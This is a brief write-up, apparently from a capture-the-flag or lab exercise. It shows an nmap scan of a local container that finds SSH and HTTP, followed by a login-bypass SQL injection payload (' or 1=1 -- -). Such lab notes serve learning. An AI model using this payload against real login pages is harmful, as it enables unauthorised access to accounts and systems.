## Port Analysis
``` bash
nmap 172.17.0.2
```

``` bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-28 17:31 EDT
Nmap scan report for 172.17.0.2
Host is up (0.0000070s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
```

Opened:
- Port 22 (ssh): Connect to the system
- Port 80 (HTTP): Web page

## SQL Injection on Login
![[Pasted image 20250328223842.png]]

SQL injection always true:
``` SQL
' or 1=1 -- -
```
